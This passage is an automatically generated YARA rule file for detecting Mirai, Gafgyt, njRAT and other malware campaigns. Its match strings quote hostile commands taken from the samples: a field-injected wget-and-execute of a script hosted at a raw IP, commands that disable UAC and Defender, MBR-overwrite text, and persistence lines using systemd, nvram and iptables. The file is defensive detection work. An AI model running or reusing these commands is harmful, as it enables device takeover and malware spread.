        hash = "2693c7ee4fba55dc548f641c0cb94485d0e18596ffef16541bd43a5104c28b20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-865c4b53.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ">,;1@8E?HJFKL-AC52BM0<G:/7D6I4.=39UVOT+NSR" wide
        $s1 = "15.1.0 which is publicly available from ftp://ftp.unicode.org/." ascii
        $s2 = " 2001-2024 Python Software Foundation. Copyright " wide
        $s3 = "wkwrwswnwowtwuwlwpwqwmw2x9x:x5x6x;x<x3x7x8x4xUw\\w]wXwYw^w_wVwZw[wWw`wgwhwcwdwiwjwawewfwbw" ascii
        $s4 = "[TyT]T_TsTuTaTdTzThTjTlToT{T|TwT}TRT3S5SSS9S;S[S>S\\S@S]SBSDSUSWSFSIS^SMSOS/SQS_S`SYSaS7SiSkS" ascii
        $s5 = "5UIGHUR KIRGHIZ YEH WITH HAMZA ABOVE WITH ALEF MAKSURA" ascii
        $s6 = "]{]|]Gv/vFv.vEv-vTv<vNv6vIv1vHv0vYvAvOv7vRv:vMv5vLv4vPv8vQv9vKv3vJv2vSv;vWv?v[vCvXv@vVv>vZvBvUv=v\\vD" ascii
        $s7 = " AND LEFT SEMI-&WARDS AND LEFTWARDS OPEN CIRCLE ARROWS" ascii
        $s8 = "V V!V\"V#V$V%V&V'V(V)V*V+V,V-V.V/V0V1V2V3V4V5V6V7V8V9V:V;V<V=V>V?V@VAVBVCVDVEVFVGVHVIVJVKVLVMVNVOVtUv" ascii
        $s9 = "{MCNCOCPCQCRCSCTCUCVCWCXCYCZC[C\\C]C^C_C`CaCbCcCdCeCfCgChCiCjCkClCmCnCoCpCqCrCsCtCuCvCwCxCyCzC{C|C}C~" ascii
        $s10 = "1DIVIDED BY HORIZONTAL BAR AND TOP HALF DIVIDED BY" ascii
        $s11 = "wTpRpSpc4.E,E/E-E$E*E(E+E)E%E9E5E:E6E&E7E3E8E4E'EDE0E2E1E@ECEAE<EBE=E>E?EEE;E" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1425856 and 12 of them
}

rule Sightlines_tlsh_45a1be01_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-45a1be01"
        date = "2026-10-29"
        campaign = "tlsh-45a1be01"
        family = ""
        hash = "5aa8f6e5d63ddb8d08f5c51aaccf13ddd8c8f24c6967c1fde82aa3efab7d5ca0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-45a1be01.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    [System.IO.File]::AppendAllText($logFile, $Line + \"`r`n\", $Script:Utf8NoBom)" ascii
        $s1 = "    [System.IO.File]::WriteAllText($logFile, (($all -join \"`r`n\") + \"`r`n\"), $Script:Utf8NoBom)" ascii
        $s2 = ": {3}' -f (Format-Endpoint $x.Ip $x.Port 46), $x.Out, (Get-GeoText $x.Ip 50), (Get-BypassText $x.Own" ascii
        $s3 = "param([int]$Interval = 5, [string]$ProcessName = 'NBA2K*', [string]$Replay, [int]$ReplayPid = 0)" ascii
        $s4 = "        try { $pingTask[$ip] = (New-Object System.Net.NetworkInformation.Ping).SendPingAsync($ip, 10" ascii
        $s5 = ": {4}' -f $now, (Format-Endpoint $x.Ip $x.Port 44), $x.Out, (Get-GeoText $x.Ip 50), (Get-BypassText " ascii
        $s6 = "function Add-PingSample([string]$Ip, [double]$Ms, [string]$Kind) {" ascii
        $s7 = "    $need = @($Ips | Where-Object { -not $geo.ContainsKey($_) } | Select-Object -Unique -First 16)" ascii
        $s8 = "$etlFiles = @((Join-Path $Script:Runtime 'track-a.etl'), (Join-Path $Script:Runtime 'track-b.etl'))" ascii
        $s9 = "ocName.ContainsKey([int]$_.Properties[0].Value) }) } catch { }" ascii
        $s10 = "    if ($tcpProbeAt.ContainsKey($key) -and ((Get-Date) - $tcpProbeAt[$key]).TotalSeconds -lt 20) { r" ascii
        $s11 = "$AppName = if ($ProcessName -like 'NBA2K*') { 'NBA 2K27' } else { $ProcessName.TrimEnd('*') }" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0d46b590_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0d46b590"
        date = "2026-10-29"
        campaign = "tlsh-0d46b590"
        family = "mirai"
        hash = "24a31a0910c04b88dd28b7c421e9ba311f86adcd7d18437318e9c2ac790da116"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0d46b590.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "%s():%i: Trying to dlopen '%s', RTLD_GLOBAL:%d RTLD_NOW:%d" ascii
        $s2 = "%s: '%s' is not an ELF executable for ARCompact" ascii
        $s3 = "%s():%i: Circular dependency, skipping '%s'," ascii
        $s4 = "%s():%i: Beginning dlopen relocation fixups" ascii
        $s5 = "%s():%i: Move %s from pos %d to %d in INIT/FINI list." ascii
        $s6 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s7 = "%s:%i: RELRO protecting %s:  start:%x, end:%x" ascii
        $s8 = "%s():%i: running ctors for library %s at '%p'" ascii
        $s9 = "%s():%i: running dtors for library %s at '%p'" ascii
        $s10 = "cannot create TLS data structures: ABORT" ascii
        $s11 = "%s: cannot apply additional memory protection after relocation" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_88b00055_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-88b00055"
        date = "2026-10-29"
        campaign = "tlsh-88b00055"
        family = "mirai"
        hash = "647b029b5424057788dd2bfda3529909ae607ec17a60e6fbe8585e69f0a4ff46"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-88b00055.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s3 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s4 = "HOST: 255.255.255.255:1900" ascii
        $s5 = "MAN: \"ssdp:discover\"" ascii
        $s6 = "M-SEARCH * HTTP/1.1" ascii
        $s7 = "service:service-agent" ascii
        $s8 = "FICMUHDKPJKCF" ascii
        $s9 = "objectClass0" ascii
        $s10 = "NKLWZQJGNN\"" ascii
        $s11 = "}UCVAJFME\"" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_contacted_53cc421e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-53cc421e"
        date = "2026-11-01"
        campaign = "contacted-53cc421e"
        family = "mirai"
        hash = "bd412af2559841d5738563fc903900c50c01c80a473f6a0e96bdc02fa6484fcb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-53cc421e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "expand 32-byte kexpand 16-byte kSECP256R1" ascii
        $s9 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s10 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s11 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1081536 and 12 of them
}

rule Sightlines_c2_d5dc8ccd_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-d5dc8ccd"
        date = "2026-10-26"
        campaign = "c2-d5dc8ccd"
        family = "mirai"
        hash = "1826b5c073569dba6d64db1bcd72c5777144e85464a30c72417ce19ece8103a2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-d5dc8ccd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget http://176.65.139.196/bi" ascii
        $s1 = "cd /tmp; wget http://176.65.139.196/bins/kla.sh -O k 2>/dev/null; chmod +x k 2>/dev/null; ./k" ascii
        $s2 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s4 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s5 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s6 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s7 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s8 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_dd52c19b_njrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dd52c19b"
        date = "2026-10-28"
        campaign = "tlsh-dd52c19b"
        family = "njrat"
        hash = "165619e61ebf6feb78b2b78f1fa407540e71712e6fe8185bb810c8dffd54eaff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dd52c19b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cmd /c reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DW" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "cmd /c rundll32.exe user32.dll,LockWorkStation" wide
        $s5 = "cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true" wide
        $s6 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s7 = "Cannot overwrite MBR, needs Admin privilege" wide
        $s8 = "As you reboot, you find that your MBR has been overwritten." ascii
        $s9 = "AdminCheck: Can't use MBR. (No admin)" wide
        $s10 = "BluetoothNotificationAreaIconWindowClass" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1e127db0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1e127db0"
        date = "2026-10-28"
        campaign = "tlsh-1e127db0"
        family = "mirai"
        hash = "01911c7a254120e0a12cdd95d8ab4c1c0f71dcb6ae6e84ca55aec7940f7d94c3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1e127db0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s3 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s4 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s5 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s6 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s7 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s10 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
        $s11 = "robust || (oldval & FUTEX_OWNER_DIED) == 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1734192 and 10 of them
}

rule Sightlines_dotnet_typelib_guid_5dabb2bb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-5dabb2bb"
        date = "2026-10-27"
        campaign = "dotnet_typelib_guid-5dabb2bb"
        family = ""
        hash = "0709bd241f958483f396fe85fefaa5e38fcf0f06c9fbacbe3dc67e130859fab4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-5dabb2bb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s1 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s2 = "$29840822-5B84-11D0-BD3B-00A0C911CE86" ascii
        $s3 = "RtlSetProcessIsCritical" ascii
        $s4 = "NtProtectVirtualMemory" ascii
        $s5 = "CreateClassEnumerator" ascii
        $s6 = "ICreateDevEnum" ascii
        $s7 = "Copyright " ascii
        $s8 = "masterKey" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 8707072 and 9 of them
}

rule Sightlines_tlsh_9de2707e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9de2707e"
        date = "2026-10-28"
        campaign = "tlsh-9de2707e"
        family = "mirai"
        hash = "0005299abc319e5180c5fc9609775583ecc8ca56ddc02153ff14c05b68736a47"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9de2707e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "kZPUbHYdNYRDXBjbR4SeWvUfvD5Sc90wMrC8XGa2Z54=" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s2 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s3 = "Accept-Language: en-US,en;q=0.9" ascii
        $s4 = "X-Requested-With: XMLHttpRequest" ascii
        $s5 = "Accept-Encoding: gzip, deflate" ascii
        $s6 = "    -> skip TOCTOU: pid recycled" ascii
        $s7 = " skip=exe-owner-only(not-root)" ascii
        $s8 = "application/json,text/plain,*/*" ascii
        $s9 = "    -> skip TOCTOU: stat gone" ascii
        $s10 = "/sys/devices/system/cpu/online" ascii
        $s11 = "Content-Length: 2147483647" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_687b93b4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-687b93b4"
        date = "2026-10-28"
        campaign = "tlsh-687b93b4"
        family = "mirai"
        hash = "0c83f3ce10f00774ab4ce0163b21e12337fd462927c7aac9749f5ffd525691ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-687b93b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "9t$$tBPPj" ascii
        $s7 = "$662*7!E" ascii
        $s8 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_signer_cert_sha1_b5077fa2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-b5077fa2"
        date = "2026-10-28"
        campaign = "signer_cert_sha1-b5077fa2"
        family = ""
        hash = "0f780235c2fe55f3954aba8f5dba435617e46f3c23102a698e582bfa8322f4ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-b5077fa2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (MinGW-W64 x86_64-msvcrt-posix-seh, built by Brecht Sanders) 13.1.0" ascii
        $s1 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s2 = "Copyright 2026 Google LLC. All rights reserved." wide
        $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s4 = "Partial loss of significance (PLOSS)" ascii
        $s5 = "Total loss of significance (TLOSS)" ascii
        $s6 = "Overflow range error (OVERFLOW)" ascii
        $s7 = "Argument domain error (DOMAIN)" ascii
        $s8 = "Argument singularity (SIGN)" ascii
        $s9 = "C:\\Users\\%s\\AppData\\Roaming" wide
        $s10 = "%s\\Google\\Chrome\\Update" wide
        $s11 = "Google Installer (x86)" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 11936592 and 12 of them
}

rule Sightlines_imphash_c7478a25_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-c7478a25"
        date = "2026-10-28"
        campaign = "imphash-c7478a25"
        family = ""
        hash = "086e083da4e7a46438aff3188beb2c0d14cb38af216c62a880cd8209dfcfcca8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-c7478a25.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV_Null_resource@?1??null_memory_resource@@YAPEAVmemory_resource@pmr@std@@XZ@" ascii
        $s1 = ".?AV_Unaligned_new_delete_resource_impl@pmr@std@@" ascii
        $s2 = ".?AV_Aligned_new_delete_resource_impl@pmr@std@@" ascii
        $s3 = ".?AV_Identity_equal_resource@pmr@std@@" ascii
        $s4 = "_Unaligned_get_default_resource" ascii
        $s5 = "_Unaligned_set_default_resource" ascii
        $s6 = ".?AVmemory_resource@pmr@std@@" ascii
        $s7 = "_Aligned_get_default_resource" ascii
        $s8 = "_Aligned_set_default_resource" ascii
        $s9 = " C Runtime Library _1" wide
        $s10 = "MSVCP140_1.dll" ascii
        $s11 = "msvcp140_1.dll" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5b1a8a01_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b1a8a01"
        date = "2026-10-27"
        campaign = "tlsh-5b1a8a01"
        family = "mirai"
        hash = "53bf22c4519282706701be4394ec3a289800944b8ae59c3afca7d22ae400eb62"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b1a8a01.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s1 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s2 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s3 = "__linuxthreads_initial_report_events" ascii
        $s4 = "__GI_pthread_attr_getschedpolicy" ascii
        $s5 = "__GI_pthread_attr_setschedpolicy" ascii
        $s6 = "__pthread_wait_for_restart_signal" ascii
        $s7 = "__GI_pthread_attr_getinheritsched" ascii
        $s8 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s9 = "__GI_pthread_attr_setinheritsched" ascii
        $s10 = "pthread_rwlockattr_setkind_np" ascii
        $s11 = "pthread_rwlockattr_getkind_np" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ac4305cd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ac4305cd"
        date = "2026-10-28"
        campaign = "tlsh-ac4305cd"
        family = ""
        hash = "3ea06f0ee098b4823cb79599df3780e7f23cce52c19aac31d2a0d47efe33a5e9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ac4305cd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "boost::math::expint_continued_fraction<%1%>(unsigned,%1%)" ascii
        $s1 = "?_Init@locale@std@@CAPEAV_Locimp@12@_N@Z" ascii
        $s2 = "?_Getgloballocale@locale@std@@CAPEAV_Locimp@12@XZ" ascii
        $s3 = "boost::math::expint_series<%1%>(unsigned,%1%)" ascii
        $s4 = "?_Getcat@?$ctype@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z" ascii
        $s5 = "boost::math::bessel_jy<%1%>(%1%,%1%) in temme_jy" ascii
        $s6 = "Cause unknown: error caused by bad argument with value %1%" ascii
        $s7 = "?_Decref@facet@locale@std@@UEAAPEAV_Facet_base@3@XZ" ascii
        $s8 = "boost::math::bessel_ik<%1%>(%1%,%1%) in temme_ik" ascii
        $s9 = "?getloc@ios_base@std@@QEBA?AVlocale@2@XZ" ascii
        $s10 = "boost::math::sph_bessel_j_small_z_series<%1%>(%1%,%1%)" ascii
        $s11 = "Series evaluation exceeded %1% iterations, giving up now." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_baccfbb6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-baccfbb6"
        date = "2026-10-28"
        campaign = "tlsh-baccfbb6"
        family = ""
        hash = "621ed067e8214758b584df19b7f9726559d32af16267e6217f878d0b96378a29"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-baccfbb6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CloudKit.framework/Versions/A/CloudKit" ascii
        $s1 = "/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit" ascii
        $s2 = "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics" ascii
        $s3 = "/System/Library/Frameworks/QuartzCore.framework/Versions/A/QuartzCore" ascii
        $s4 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s5 = "/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation" ascii
        $s6 = "/System/Library/Frameworks/CoreText.framework/Versions/A/CoreText" ascii
        $s7 = "n limit (e.g. symlink loop)stale network file handleinvalid input parameterinvalid datatimed outwrit" ascii
        $s8 = "/System/Library/Frameworks/CoreImage.framework/Versions/A/CoreImage" ascii
        $s9 = "invalid stack size...failed to write the buffered datamust specify at least one of read, write, or a" ascii
        $s10 = "xceededfile too largeresource busyexecutable file busydeadlockcross-device link or renametoo many li" ascii
        $s11 = "*incomplete utf-8 byte sequence from index " ascii
    condition:
        filesize < 4121888 and 12 of them
}

rule Sightlines_tlsh_d52bdde4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d52bdde4"
        date = "2026-10-28"
        campaign = "tlsh-d52bdde4"
        family = ""
        hash = "033e075426fe475870ccca9cc9caebdfb34206461ca900cecfb8cfa9ec5ff3df"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d52bdde4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb0EEE" ascii
        $s1 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb0EEE" ascii
        $s2 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIwLb1EEE" ascii
        $s3 = "*NSt13__facet_shims12_GLOBAL__N_115moneypunct_shimIcLb1EEE" ascii
        $s4 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIwEE" ascii
        $s5 = "*NSt13__facet_shims12_GLOBAL__N_114money_put_shimIcEE" ascii
        $s6 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIwEE" ascii
        $s7 = "basic_filebuf::underflow codecvt::max_length() is not valid" ascii
        $s8 = "*NSt13__facet_shims12_GLOBAL__N_113numpunct_shimIwEE" ascii
        $s9 = "*NSt13__facet_shims12_GLOBAL__N_114money_get_shimIcEE" ascii
        $s10 = "*NSt13__facet_shims12_GLOBAL__N_112collate_shimIwEE" ascii
        $s11 = "*NSt13__facet_shims12_GLOBAL__N_113numpunct_shimIcEE" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3034112 and 11 of them
}

rule Sightlines_tlsh_90182bb0_gafgyt
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-90182bb0"
        date = "2026-10-28"
        campaign = "tlsh-90182bb0"
        family = "gafgyt"
        hash = "0a4ba0981607061511b773f6e4b029003d013aa5ea751148e8f7c44c1d2cd62c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-90182bb0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\K]6D3]4$T]^$DGD$DA3JO=*B4P&;7;1/proc/self/exe" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" ascii
        $s3 = "Iranbot-Ultimate-V1 init: join t.me/flylegit" ascii
        $s4 = "upgrade-insecure-requests" ascii
        $s5 = "__vdso_clock_gettime64" ascii
        $s6 = "Connection: keep-alive" ascii
        $s7 = "sec-ch-ua-platform" ascii
        $s8 = "gzip, deflate, br" ascii
        $s9 = ".note.gnu.property" ascii
        $s10 = "/proc/self/status" ascii
        $s11 = "sec-ch-ua-mobile" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_fcd3df0e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fcd3df0e"
        date = "2026-10-28"
        campaign = "tlsh-fcd3df0e"
        family = ""
        hash = "01dae93af638e17f975ba53ed4f69b2983d96dab32e2a45b4280eb03bfbbccb1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fcd3df0e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"" ascii
        $s2 = ",:HVVVVVVdt-0X+0X 0X-0x+0x 0x" ascii
        $s3 = "upgrade-insecure-requests" ascii
        $s4 = "Connection: keep-alive" ascii
        $s5 = "__kernel_clock_gettime" ascii
        $s6 = "sec-ch-ua-platform" ascii
        $s7 = "gzip, deflate, br" ascii
        $s8 = "/proc/self/status" ascii
        $s9 = "sec-ch-ua-mobile" ascii
        $s10 = "GET %s HTTP/1.1" ascii
        $s11 = "en-US,en;q=0.9" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_8d4aeae4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-8d4aeae4"
        date = "2026-10-25"
        campaign = "host-8d4aeae4"
        family = "mirai"
        hash = "0d5e6bcebdb3b0e63d1274297ea60eb6aa3d67102cd06927f5c9fca1e56727be"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-8d4aeae4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "clang version 18.1.6 (https://github.com/ziglang/zig-bootstrap 98bc6bf4fc4009888d33941daf6b600d20a42" ascii
        $s1 = "systemctl enable %s.service 2>/dev/null" ascii
        $s2 = "    echo \"Usage: $0 {start|stop|restart}\"" ascii
        $s3 = "/usr/lib/accountsservice/accounts-daemon" ascii
        $s4 = "systemctl start %s.service 2>/dev/null" ascii
        $s5 = "REGISTER linux %s %d %ld %ld l4 %.0f %s" ascii
        $s6 = "update-rc.d %s defaults 2>/dev/null" ascii
        $s7 = "Description=System Update Service" ascii
        $s8 = "PATH=/usr/bin:/bin:/usr/local/bin" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s10 = "/usr/lib/systemd/systemd-timesyncd" ascii
